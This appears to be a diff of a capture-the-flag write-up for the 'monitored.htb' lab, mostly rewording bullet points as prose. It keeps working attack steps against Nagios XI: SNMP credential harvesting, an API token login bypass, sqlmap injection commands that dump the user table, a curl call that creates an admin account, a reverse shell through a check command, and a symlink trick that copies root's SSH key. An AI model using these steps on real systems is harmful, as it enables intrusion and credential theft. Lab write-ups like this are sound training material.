@@ -52,8 +52,7 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Wed Sep 30 12:13:20 2026 -- 1 IP address (1 host up) scanned in 70.49 seconds
 ```
 
-- It redirected to `nagios.monitored.htb`
-- We got a login page `https://nagios.monitored.htb`
+Port 80 redirected to `nagios.monitored.htb`, which served a login page at `https://nagios.monitored.htb`.
 
 
 ```sh
@@ -72,34 +71,33 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Wed Sep 30 12:16:44 2026 -- 1 IP address (1 host up) scanned in 203.70 seconds
 ```
 
-The SNMP service is open:
-- Checking for the community string
+The SNMP service is open, so check for the community string:
 
 ```sh
 onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 10.129.11.125
 ```
 
-- Community string => `public`
+Community string => `public`
 
 ```sh
 snmpwalk -v2c -c public 10.129.11.125
 ```
 
-Waited a long time till I got this number "iso.3.6.1.2.1.25.4.2.1.**5**.621":
+After walking the full OID tree for a while, one entry finally stood out:
 
 ```output
 sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB
 ```
 
-Gained username and password
+That gave us a username and password:
 
 > `svc - XjH7VCehowpR1xZB`
 
-Tried to login but it gave an error message different from the normal one.
+Trying to log in, we got an error message different from the normal one.
 
 #### Bypassing Disabled Account Restrictions
-- We have credentials, but we cannot access the web interface due to the account being disabled.
-- Researching Nagios, we find this post on the Nagios forums that provides the following command:
+
+We have credentials, but we cannot access the web interface due to the account being disabled. Researching Nagios, we find a post on the Nagios forums that provides the following command:
 
 > Reference : https://support.nagios.com/forum/viewtopic.php?p=310724&hilit=login+insecure+login#p310724
 
@@ -126,7 +124,7 @@ curl -XPOST -k -L 'http://nagios.monitored.htb/nagiosxi/api/v1/authenticate' -d
 }
 ```
 
-We gained an authentication token for `svc`
+We gained an authentication token for `svc`.
 
 The next command in the post shows how this token can be used:
 
@@ -140,9 +138,7 @@ So we can do actions with the token:
 https://nagios.monitored.htb/nagiosxi/login.php?token=f2ea23fc0c6fa7db56c0f938cbc22b429d63f8e2
 ```
 
-We logged in as the `svc` user.
-
-- Version in the bottom left corner => `Nagios XI 5.11.0`
+We logged in as the `svc` user. The version in the bottom left corner shows `Nagios XI 5.11.0`.
 
 # User
 
@@ -153,23 +149,19 @@ According to the CVE, this version allows authenticated attackers to execute arb
 
 According to the reference, the POST data consists of the intended action and message ID – `action=acknowledge banner message&id=3`.
 
-Exploitation:
-- Intercept and modify the request
-- With a **wild card** (`*`) on the **id** parameter it returns a sql syntax error which **revealed sql server information** (MariaDB aka MySQL)
-
-- Grab the request or grab the cookie — we can use the `--cookie` flag on **sqlmap** (we went with the cookie flag because the **request file** didn't work great with **sqlmap** even after adding the Content-type header)
+Intercept and modify the request — with a **wild card** (`*`) on the **id** parameter it returns a sql syntax error which **revealed sql server information** (MariaDB aka MySQL). Then grab the request or grab the cookie, and use the `--cookie` flag on **sqlmap** (we went with the cookie flag because the **request file** didn't work great with **sqlmap** even after adding the Content-type header):
 
 ```sh
 sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --batch -p id --cookie="nagiosxi=enl7c4k4t90oqb32ddehrdd9s7" --dbs --threads=10
 ```
 
-- database - `nagiosxi`
+database - `nagiosxi`
 
 ```sh
 sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --batch -p id --cookie="nagiosxi=enl7c4k4t90oqb32ddehrdd9s7" -D nagiosxi --threads=10 --tables
 ```
 
-- table - `xi_users`
+table - `xi_users`
 
 ```sh
 sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --batch -p id --cookie="nagiosxi=enl7c4k4t90oqb32ddehrdd9s7" -D nagiosxi --threads=10 -T xi_users --dump
@@ -183,31 +175,21 @@ sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper
 | 2       | svc@monitored.htb   | svc                  | vZlmJoAEAO9ISmM5TnWdFeqtsNb3mlkF2sdPsQVKteiNTNuOufPQqr43gHV3tlKl
 ```
 
-- We gained a **bcrypt hash** as well but we have the **api-key**, so no need to waste time cracking it.
+We gained a **bcrypt hash** as well but we have the **api-key**, so no need to waste time cracking it.
 
 > Reference : https://www.exploit-db.com/exploits/44969
 
-In the above reference it shows how to use the api key to create a new user with admin privilege:
-- `/nagiosxi/api/v1/system/user` -> api pathway to create a new user
-- `auth_level` => Parameter to assign a role for the new user
+In the above reference it shows how to use the api key to create a new user with admin privilege, with `/nagiosxi/api/v1/system/user` as the api pathway to create a new user and `auth_level` as the parameter to assign a role for the new user:
 
 ```sh
 curl -k -s 'http://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL' -d 'username=dante&password=dante&name=dante&email=dante@localhost&auth_level=admin' 
 ```
 
-Log in as `dante` (admin)
+Log in as `dante` (admin), then navigate to `Configure > Core Config Manager > Commands` and create a new command. Add a new command called `ashell` (so it sits on top, we don't have to search for it), then click Save and Apply Configuration.
 
-- Navigate to `Configure > Core Config Manager > Commands`
-- Create a new command.
-- Then add a new command called `ashell` (so it sits on top, we don't have to search for it)
-- Click Save, then Apply Configuration
+Setup a listener.
 
-- Setup a listener
-
-Now navigate to `Monitoring > Hosts`:
-- Click on `localhost` 
-- Select `shell` as the `check command`
-- Click on `Run check command`
+Now navigate to `Monitoring > Hosts`, click on `localhost`, select `shell` as the `check command`, and click on `Run check command`.
 
 Gained shell as user `nagios`
 
@@ -269,13 +251,13 @@ fi
 
 ...<SNIP>...
 ```
-- The script checks if **phpmailer.log** **exists** in the **/usr/local/nagiosxi/tmp/** directory and if so, it uses the **tail command** to copy the last 100 lines of this log file into a designated folder within `/usr/local/nagiosxi/var/components/profile/`.
+The script checks if **phpmailer.log** **exists** in the **/usr/local/nagiosxi/tmp/** directory and if so, it uses the **tail command** to copy the last 100 lines of this log file into a designated folder within `/usr/local/nagiosxi/var/components/profile/`.
 
 Since we can run the script with elevated privileges, this functionality is vulnerable.
 
 #### Two attack ways
-- We can set a **PATH** variable and create a fake **tail** binary to gain a shell
-- symbolic link - to copy (the functionality of `getprofile.sh` script) the ssh key of root
+
+We can set a **PATH** variable and create a fake **tail** binary to gain a shell, or use a symbolic link to copy (the functionality of `getprofile.sh` script) the ssh key of root.
 
 #### Symlink aka Symbolic link 
 
@@ -300,7 +282,8 @@ This configuration means that if the **root** user has a **private key** in thei
 
 
 Exploitation:
-- Create a **symlink** on the tmp directory:
+
+Create a **symlink** on the tmp directory:
 
 ```sh
 ln -s /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log
@@ -308,20 +291,19 @@ ln -s /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log
 
 Now when the script tries to copy **phpmailer.log** it **points** to the **id_rsa** key of **root** and copies that.
 
-- Execute the script with an arbitrary folder name:
+Execute the script with an arbitrary folder name:
 
 ```sh
 sudo ./getprofile.sh 1
 ```
 
-- Access the copied data in `/usr/local/nagiosxi/var/components/profile.zip`
-- Copy the zip file to the tmp directory:
+Access the copied data in `/usr/local/nagiosxi/var/components/profile.zip`, and copy the zip file to the tmp directory:
 
 ```
 cp /usr/local/nagiosxi/var/components/profile.zip /tmp/
 ```
 
-- Unzip it and check for the key:
+Unzip it and check for the key:
 
 ```sh
 cat profile-1699756647/phpmailer.log
